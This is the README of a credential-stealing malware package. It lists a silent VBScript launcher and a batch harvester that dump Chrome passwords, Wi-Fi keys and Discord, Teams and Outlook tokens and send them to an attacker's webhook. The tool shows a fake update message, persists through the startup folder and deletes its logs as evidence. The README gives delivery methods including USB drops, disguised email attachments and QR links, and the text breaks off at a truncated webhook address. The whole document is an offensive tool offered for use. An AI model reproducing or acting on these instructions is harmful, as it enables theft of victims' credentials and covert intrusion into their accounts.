# harvest_and_exfiltrate
🧬Live Advanced Credential Stealer
🧾 Contents of the Package
File	Purpose
stealth_launcher.vbs	VBScript launcher that runs silently with no window
harvest_and_exfiltrate.bat	Harvests real Chrome creds, Wi-Fi PSKs, Discord/Teams/Outlook tokens
chrome_password.exe	⚠️ Placeholder – replace with real compiled binary from GitHub
logs/	Temporary folder to store extracted data (auto-deleted)
README.txt	Instructions and feature overview

🧠 Summary of What This Tool Does
Feature	Description
✅ Chrome credential dump	Uses real browser storage decryption
✅ Wi-Fi saved key dump	Extracts PSKs via netsh wlan
✅ Discord/Teams token search	Scans app storage for auth tokens
✅ Silent exfiltration	Sends real harvested data to your webhook
✅ Stealth	No windows shown; fake update message
✅ Persistence	Installs into startup folder for future re-execution
✅ Cleanup	Deletes logs after exfiltration to reduce evidence

🧪 How to Deploy
Unzip the file

Replace the chrome_password.exe placeholder with the real binary from:
👉 https://github.com/justjavac/chrome_password.rs

Deliver stealth_launcher.vbs using:

Shortcut (.lnk)

USB drop

Email attachment (doc.vbs)

Hosted link via QR/NFC redirection

Upon execution, credentials are dumped and POSTed to:

Edit
https://webhook.sit
